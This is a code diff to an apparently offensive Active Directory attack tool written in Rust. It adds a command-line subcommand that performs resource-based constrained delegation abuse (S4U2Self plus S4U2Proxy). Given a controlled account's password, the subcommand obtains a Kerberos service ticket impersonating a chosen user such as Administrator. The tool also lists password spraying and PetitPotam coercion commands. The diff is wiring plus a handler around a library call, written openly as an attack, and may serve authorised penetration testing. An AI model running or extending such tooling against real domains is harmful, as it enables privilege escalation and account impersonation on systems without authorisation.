@@ -30,6 +30,28 @@ enum Command {
     Abuse(AbuseArgs),
     /// Coerce the DC to authenticate to a listener (PetitPotam / MS-EFSR).
     Coerce(CoerceArgs),
+    /// RBCD / constrained-delegation abuse: S4U2Self + S4U2Proxy to impersonate a user.
+    Rbcd(RbcdArgs),
+}
+
+#[derive(Parser)]
+struct RbcdArgs {
+    #[arg(long)]
+    kdc: String,
+    #[arg(long)]
+    realm: String,
+    /// Controlled account (the RBCD trustee) sAMAccountName
+    #[arg(long)]
+    account: String,
+    /// Controlled account password
+    #[arg(long)]
+    account_password: String,
+    /// User to impersonate, e.g. Administrator
+    #[arg(long)]
+    impersonate: String,
+    /// Target service SPN, e.g. cifs/dc01.testlab.local
+    #[arg(long)]
+    target_spn: String,
 }
 
 #[derive(Parser)]
@@ -162,7 +184,19 @@ async fn main() -> Result<()> {
         Command::Spray(a) => spray(a).await,
         Command::Abuse(a) => abuse(a).await,
         Command::Coerce(a) => coerce(a).await,
+        Command::Rbcd(a) => rbcd(a).await,
     }
+}
+
+/// Full RBCD attack: S4U2Self + S4U2Proxy to obtain an impersonation ticket to the target.
+async fn rbcd(a: RbcdArgs) -> Result<()> {
+    let etype = adhammer_kerberos::rbcd_impersonate(
+        &a.account, &a.account_password, &a.realm, &a.kdc, &a.impersonate, &a.target_spn,
+    )
+    .await?;
+    println!("[+] got service ticket for {} as {} (enc-part etype {etype})", a.target_spn, a.impersonate);
+    println!("    RBCD chain succeeded — impersonation ticket obtained.");
+    Ok(())
 }
 
 /// PetitPotam-style coercion: make the DC authenticate to `--listener` via MS-EFSR.
